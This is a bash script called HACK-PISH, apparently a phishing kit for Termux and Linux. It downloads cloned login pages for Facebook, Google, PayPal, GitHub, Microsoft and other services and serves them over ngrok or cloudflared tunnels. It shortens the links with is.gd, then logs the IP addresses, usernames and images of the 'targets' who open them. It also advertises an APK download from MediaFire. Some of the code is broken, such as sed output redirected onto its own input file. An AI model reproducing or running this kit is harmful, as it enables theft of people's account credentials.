#!/data/data/com.termux/files/usr/bin/bash


black="\033[1;30m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
blue="\033[1;34m"
purple="\033[1;35m"
cyan="\033[1;36m"
violate="\033[1;37m"
white="\033[0;37m"
nc="\033[00m"

# Output snippets
info="${red}[${white}+${red}] ${cyan}"
ask="${red}[${white}?${red}] ${violate}"
error="${cyan}[${white}!${cyan}] ${red}"
success="${red}[${white}√${red}] ${green}"


cwd=`pwd`

# Logo 
logo="    
${blue}  _   _    _    ____ _  __     ______ _ _____ _   _ 
${blue} | | | |  / \  / ___| |/ /    |  __  | |  ___| | | |  
${blue} | |_| | / _ \| |   | ' /_____| |__| | | |___  |_| |  
${blue} |  _  |/ ___ \ |___| . \_____| |____| |____ |  _  | 
${blue} |_| |_/_/   \_\____|_|\_\    |_|    |_|_____|_| |_| 
${green}                                               [By Jeremy]
"

# Package Installer
pacin(){
    if $sudo && $pacman; then
        sudo pacman -S $1 --noconfirm
    fi
}

# Kill running instances of required packages
killer() {
if [ `pidof php > /dev/null 2>&1` ]; then
    killall php
fi
if [ `pidof ngrok > /dev/null 2>&1` ]; then
    killall ngrok
fi
if [ `pidof cloudflared > /dev/null 2>&1` ]; then
    killall cloudflared
fi
if [ `pidof curl > /dev/null 2>&1` ]; then
    killall curl
fi
if [ `pidof wget > /dev/null 2>&1` ]; then
    killall wget
fi
if [ `pidof unzip > /dev/null 2>&1` ]; then
    killall unzip
fi
}

# Check if offline
netcheck() {
    while true; do
        wget --spider --quiet https://github.com
        if [ "$?" != 0 ]; then
            echo -e "${error}No internet!\007\n"
            sleep 2
        else
            break
        fi
    done
}

# Delete ngrok file
ngrokdel() {
    unzip ngrok.zip
    rm -rf ngrok.zip
}

# Set template
replacer() {
    while true; do
    if echo $option | grep -q "1"; then
        sed "s+forwarding_link+"$1"+g" login.html > login.html
    
        break
    elif echo $option | grep -q "2"; then
        sed "s+forwarding_link+"$1"+g" login.html > login.html
        break
    elif echo $option | grep -q "3"; then
        sed "s+forwarding_link+"$1"+g" login.html > login.html
        break
    elif echo $option | grep -q "4"; then
        sed "s+forwarding_link+"$1"+g" login.html > login.html
        break
    elif echo $option | grep -q "5"; then
        sed "s+forwarding_link+"$1"+g" login.html > login.html
        break
    elif echo $option | grep -q "6"; then
        sed "s+forwarding_link+"$1"+g" login.html > login.html
        break
    elif echo $option | grep -q "7"; then
        sed "s+forwarding_link+"$1"+g" login.html > login.html
        break
    elif echo $option | grep -q "8"; then
        sed "s+forwarding_link+"$1"+g" login.html > login.html
        break
    elif echo $option | grep -q "9"; then
        sed "s+forwarding_link+"$1"+g" login.html > login.html
        break
    elif echo $option | grep -q "10"; then
        sed "s+forwarding_link+"$1"+g" login.html > login.html
        break
    elif echo $option | grep -q "11"; then
        sed "s+forwarding_link+"$1"+g" login.html > login.html
        break
    elif echo $option | grep -q "12"; then
        sed "s+forwarding_link+"$1"+g" login.html > login.html
        break
    elif echo $option | grep -q "13"; then
        sed "s+forwarding_link+"$1"+g" login.html > login.html
        break
    elif echo $option | grep -q "14"; then
        sed "s+forwarding_link+"$1"+g" login.html > login.html
        break
    elif echo $option | grep -q "15"; then
        sed "s+forwarding_link+"$1"+g" login.html > login.html
        break
    elif echo $option | grep -q "16"; then
        sed "s+forwarding_link+"$1"+g" login.html > login.html
        break
    elif echo $option | grep -q "17"; then
        sed "s+forwarding_link+"$1"+g" login.html > login.html
        break
        
    fi
    done
    echo -e "${info}Your urls are: ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \n"
    sleep 1
    echo -e "${success}Link 1 : ${1}\n"
    sleep 1
    netcheck
    masked=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${1})
    if ! [[ -z $masked ]]; then
        echo -e "${success}URL 2 > ${masked}\n"
    fi
}

# Prevent ^C
stty -echoctl

# Detect UserInterrupt
trap "echo -e '\n${success}Thanks for Using! Install this apk : https://www.mediafire.com/file/f50ipqbjn8knin3/ChatEyes.apk/file'; exit" 2

# Termux
if [[ -d /data/data/com.termux/files/home ]]; then
termux-fix-shebang hack_pish.sh
termux=true
else
termux=false
fi

# Workdir
if $termux; then
if ! [ -d /sdcard/Pictures ]; then
cd /sdcard && mkdir Pictures
fi
export FOL="/sdcard/Pictures"
cd "$FOL"
if ! [[ -e ".temp" ]]; then 
touch .temp  || (termux-setup-storage && echo -e "\n${error}Please Restart Termux!\n\007" && sleep 5 && exit 0)
fi
cd "$cwd"
else
if [ -d "$HOME/Pictures" ]; then
export FOL="$HOME/Pictures"
else
export FOL="$cwd"
fi
fi

# Set Tunneler
export TN="Cloudflared"

# Set Package Manager
if [ `command -v sudo` ]; then
    sudo=true
else
    sudo=false
fi
if $sudo; then
if [ `command -v apt` ]; then
    pac_man="sudo apt"
elif  [ `command -v apt-get` ]; then
    pac_man="sudo apt-get"
elif  [ `command -v yum` ]; then
    pac_man="sudo yum"
elif [ `command -v dnf` ]; then
    pac_man="sudo dnf"
elif [ `command -v apk` ]; then
    pac_man="sudo apk"
elif [ `command -v pacman` ]; then
    pacman=true
else
    echo -e "${error}No supported package manager found! Install packages manually!\007\n"
    exit 1
fi
else
if [ `command -v apt` ]; then
    pac_man="apt"
elif [ `command -v apt-get` ]; then
    pac_man="apt-get"
elif [ `command -v brew` ]; then
    pac_man="brew"
else
    echo -e "${error}No supported package manager found! Install packages manually!\007\n"
    exit 1
fi
fi


# Install Dependicies
if ! [ `command -v php` ]; then
    echo -e "${info}Installing php...."
    $pac_man install php -y
    pacin php
fi
if ! [ `command -v curl` ]; then
    echo -e "${info}Installing curl...."
    $pac_man install curl -y
    pacin "unzip"
fi
if ! [ `command -v unzip` ]; then
    echo -e "${info}Installing unzip...."
    $pac_man install unzip -y
    pacin "unzip"
fi
if ! [ `command -v wget` ]; then
    echo -e "${info}Installing wget...."
    $pac_man install wget -y
    pacin "wget"
fi
if $termux; then
if ! [ `command -v proot` ]; then
    echo -e "${info}Installing proot...."
    pkg install proot -y
fi
if ! [ `command -v proot` ]; then
    echo -e "${error}Proot can't be installed!\007\n"
    exit 1
fi
fi
if ! [ `command -v php` ]; then
    echo -e "${error}PHP cannot be installed!\007\n"
    exit 1
fi
if ! [ `command -v curl` ]; then
    echo -e "${error}Curl cannot be installed!\007\n"
    exit 1
fi
if ! [ `command -v unzip` ]; then
    echo -e "${error}Unzip cannot be installed!\007\n"
    exit 1
fi
if ! [ `command -v wget` ]; then
    echo -e "${error}Wget cannot be installed!\007\n"
    exit 1
fi
if [ `pidof php > /dev/null 2>&1` ]; then
    echo -e "${error}Previous php cannot be closed. Restart terminal!\007\n"
    killer; exit 1
fi
if [ `pidof ngrok > /dev/null 2>&1` ]; then
    echo -e "${error}Previous ngrok cannot be closed. Restart terminal!\007\n"
    killer; exit 1
fi

# Termux should run from home
if $termux; then
    path=`pwd`
    if echo "$path" | grep -q "home"; then
        printf ""
    else
        echo -e "${error}Invalid directory. Run from home!\007\n"
        killer; exit 1
    fi
fi

# Download tunnlers
if ! [[ -f $HOME/.ngrokfolder/ngrok && -f $HOME/.cffolder/cloudflared ]] ; then
    if ! [[ -d $HOME/.ngrokfolder ]]; then
        cd $HOME && mkdir .ngrokfolder
    fi
    if ! [[ -d $HOME/.cffolder ]]; then
        cd $HOME && mkdir .cffolder
    fi
    p=`uname -m`
    d=`uname`
    while true; do
        echo -e "\n${info}Downloading Tunnelers:\n"
        netcheck
        if [ -e ngrok.zip ];then
            rm -rf ngrok.zip
        fi
        cd "$cwd"
        if echo "$d" | grep -q "Darwin"; then
            if echo "$p" | grep -q "x86_64"; then
                wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-darwin-amd64.zip" -O "ngrok.zip"
                ngrokdel
                wget -q --show-progress "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz" -O "cloudflared.tgz"
                tar -zxf cloudflared.tgz > /dev/null 2>&1
                rm -rf cloudflared.tgz
                break
            elif echo "$p" | grep -q "arm64"; then
                wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-arm64.zip" -O "ngrok.zip"
                ngrokdel
                echo -e "${error}Cloudflared not available for device architecture!"
                sleep 3
                break
            else
                echo -e "${error}Device architecture unknown. Download ngrok/cloudflared manually!"
                sleep 3
                break
            fi
        elif echo "$d" | grep -q "Linux"; then
            if echo "$p" | grep -q "aarch64"; then
                if [ -e ngrok-stable-linux-arm64.tgz ];then
                   rm -rf ngrok-stable-linux-arm64.tgz
                fi
                wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm64.tgz" -O "ngrok.tgz"
                tar -zxf ngrok.tgz
                rm -rf ngrok.tgz
                wget -q --show-progress "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64" -O "cloudflared"
                break
            elif echo "$p" | grep -q "arm"; then
                wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm.zip" -O "ngrok.zip"
                ngrokdel
                wget -q --show-progress 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' -O "cloudflared"
                break
            elif echo "$p" | grep -q "x86_64"; then
                wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-amd64.zip" -O "ngrok.zip"
                ngrokdel
                wget -q --show-progress 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' -O "cloudflared"
                break
            else
                wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-386.zip" -O "ngrok.zip"
                ngrokdel
                wget -q --show-progress "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386" -O "cloudflared"
                break
            fi
        else
            echo -e "${error}Unsupported Platform!"
            exit
        fi
    done
    sleep 1
    cd "$cwd"
    mv -f ngrok $HOME/.ngrokfolder
    mv -f cloudflared $HOME/.cffolder
    if $sudo; then
    sudo chmod +x $HOME/.ngrokfolder/ngrok
    sudo chmod +x $HOME/.cffolder/cloudflared
    else
    chmod +x $HOME/.ngrokfolder/ngrok
    chmod +x $HOME/.cffolder/cloudflared
    fi
fi


# Start Point
while true; do
clear
echo -e "$logo"
sleep 1
echo -e "${ask}Choose an option:
${red}[${white}1${red}] ${cyan}Facebook
${red}[${white}2${red}] ${cyan}Fb Messeger
${red}[${white}3${red}] ${cyan}Fb Security
${red}[${white}4${red}] ${cyan}Insagram
${red}[${white}5${red}] ${cyan}Google
${red}[${white}6${red}] ${cyan}Google New
${red}[${white}7${red}] ${cyan}Github
${red}[${white}8${red}] ${cyan}Gitlab
${red}[${white}9${red}] ${cyan}Linkedin
${red}[${white}10${red}] ${cyan}Mediafire
${red}[${white}11${red}] ${cyan}Microsoft
${red}[${white}12${red}] ${cyan}Netflix
${red}[${white}13${red}] ${cyan}Paypal
${red}[${white}14${red}] ${cyan}Twiter
${red}[${white}15${red}] ${cyan}Wordpress
${red}[${white}16${red}] ${cyan}Dropbox
${red}[${white}17${red}] ${cyan}Discord
${red}[${white}p${red}] ${cyan}Change Default Port (current: ${red}${PORT}${yellow})
${red}[${white}t${red}] ${cyan}Change Default Tunneler (current: ${red}${TN}${yellow})
 ${cyan}Exit${blue}
"

sleep 1
printf "${cyan}\nOption${nc}${blue} ${red}$ ${nc}"
read option
# Select template
    if echo $option | grep -q "1"; then
        dir="facebook"
        break
    elif echo $option | grep -q "2"; then
        dir="fb_messenger"
        break
    elif echo $option | grep -q "3"; then
        dir="fb_security"
        break
    elif echo $option | grep -q "4"; then
        dir="instagram"
        break
    elif echo $option | grep -q "5"; then
        dir="google"
        break
    elif echo $option | grep -q "6"; then
        dir="google_new"
        break
    elif echo $option | grep -q "7"; then
        dir="github"
        break
    elif echo $option | grep -q "8"; then
        dir="gitlab"
        break
    elif echo $option | grep -q "9"; then
        dir="linkedin"
        break
    elif echo $option | grep -q "10"; then
        dir="mediafire"
        break
    elif echo $option | grep -q "11"; then
        dir="microsoft"
        break
    elif echo $option | grep -q "12"; then
        dir="netflix"
        break
    elif echo $option | grep -q "13"; then
        dir="paypal"
        break
    elif echo $option | grep -q "14"; then
        dir="twitter"
        break
    elif echo $option | grep -q "15"; then
        dir="wordpress"
        break
    elif echo $option | grep -q "16"; then
        dir="dropbox"
        break
    elif echo $option | grep -q "17"; then
        dir="discord"
        break
        
    elif echo $option | grep -q "t"; then
        if [ $TN == "Cloudflared" ]; then
            export TN="Ngrok"
        else
            export TN="Cloudflared"
        fi
    elif echo $option | grep -q "i"; then
        printf "\n${ask}Enter Directory:${cyan}\n\nXPHANTOM${nc}@${blue}XPH4N70M ${red}$ ${nc}"
        read dire
        if ! [ -d $dire ]; then
            echo -e "\n${error}Invalid directory!\n\007"
            sleep 1
        else
            export FOL="$dire"
            echo -e "\n${success}Directory changed successfully!\n"
            sleep 1
        fi
    elif echo $option | grep -q "x"; then
        clear
        echo -e "$logo"
        echo -e "$red[ToolName]  ${cyan}  :[HACK-PISH]
$red[Version]    ${cyan} :[1.1]
$red[Description]${cyan} :[HackPish tool]
$red[Author]     ${cyan} :[JEREMY]
$red[Github]     ${cyan} :[https://github.com/jeremy] 
$red[Join us]    ${cyan} :[https://bit.ly/35655S3r]
$red[Telegarm]   ${cyan} :[https://t.me/jeremy]"
printf "${cyan}\nJEREMY${nc}@${cyan} ${red}$ ${nc}"
read about
    elif echo $option | grep -q "m"; then
        xdg-open "https://bit.ly/3PV3S3r"
    elif echo $option | grep -q "0"; then
        exit 0
    else
        echo -e "\n${error}Invalid input!\007"
        sleep 1
    fi
done
cd $cwd
if [ -e websites.zip ];then
unzip websites.zip > /dev/null 2>&1
rm -rf websites.zip
fi
if ! [ -d $dir ];then
mkdir $dir
cd $dir
netcheck
wget -q --show-progress "https://github.com/XPH4N70M/files/raw/main/${dir}.zip"
unzip ${dir}.zip > /dev/null 2>&1
rm -rf ${dir}.zip
else
cd $dir
fi 

# Hotspot required for termux
if $termux; then
echo -e "\n${info}If you haven't turned on hotspot, please enable it!"
sleep 3
fi
echo -e "\n${info}Starting PHP Server at 127.0.0.1:7777\n"
netcheck
php -S 127.0.0.1:7777 > /dev/null 2>&1 &
sleep 2
echo -e "${info}Starting link tunnelers......\n"
if [ -e "$HOME/.cffolder/log.txt" ]; then
rm -rf "$HOME/.cffolder/log.txt"
fi
netcheck
cd $HOME/.ngrokfolder && ./ngrok http 127.0.0.1:7777 > /dev/null 2>&1 &
if $termux; then
cd $HOME/.cffolder && termux-chroot ./cloudflared tunnel -url "127.0.0.1:7777" --logfile "log.txt" > /dev/null 2>&1 &
else
cd $HOME/.cffolder && ./cloudflared tunnel -url "127.0.0.1:7777" --logfile "log.txt" > /dev/null 2>&1 &
fi
sleep 8
ngroklink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
if (echo "$ngroklink" | grep -q "ngrok"); then
ngrokcheck=true
else
ngrokcheck=false
fi
cflink=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "$HOME/.cffolder/log.txt")
if (echo "$cflink" | grep -q "cloudflare"); then
cfcheck=true
else
cfcheck=false
fi
while true; do
if ( $cfcheck && $ngrokcheck ); then
    if [ $TN == "Cloudflared" ]; then
        echo -e "${success}Cloudflared choosen!\n"
        replacer "$cflink"
    else
        echo -e "${success}Ngrok choosen!\n"
        replacer "$ngroklink"
    fi
    break
fi
if ( $cfcheck &&  ! $ngrokcheck ); then
    echo -e "${success}Cloudflared started succesfully!\n"
    replacer "$cflink"
    break
fi
if ( ! $cfcheck && $ngrokcheck ); then
    echo -e "${success}Ngrok started succesfully!\n"
    replacer "$ngroklink"
    break
fi
if ! ( $cfcheck && $ngrokcheck ); then
    echo -e "${error}Tunneling failed!\n"
    killer; exit 1
fi
done
sleep 1
status=$(curl -s --head -w %{http_code} 127.0.0.1:7777 -o /dev/null)
if echo "$status" | grep -q "404"; then
    echo -e "${error}PHP couldn't start!\n\007"
    killer; exit 1
else
    echo -e "${success}PHP started succesfully!\n"
fi
sleep 1
rm -rf ip.txt

echo -e "${info}Waiting for target. ${cyan}Press ${red}Ctrl + C ${cyan}to exit...\n"
while true; do
    if [[ -e "ip.txt" ]]; then
        echo -e "\007${success}Target opened the link!\n"
        while IFS= read -r line; do
            echo -e "${green}[${blue}*${green}]${yellow} $line"
        done < ip.txt
        echo ""
        touch username.txt
        cat ip.txt >> $cwd/ips.txt
        cat username.txt >> $cwd/usernames.txt
        rm -rf ip.txt
        rm -rf username.txt  
    fi
    sleep 0.5
    if [[ -e "log.txt" ]]; then
        echo -e "\007${success}IMAGE FILE RECEIVED ! Download...\n"
        file=`ls | grep png`
        mv -f $file $FOL
        rm -rf log.txt
    fi
    sleep 0.5
done 
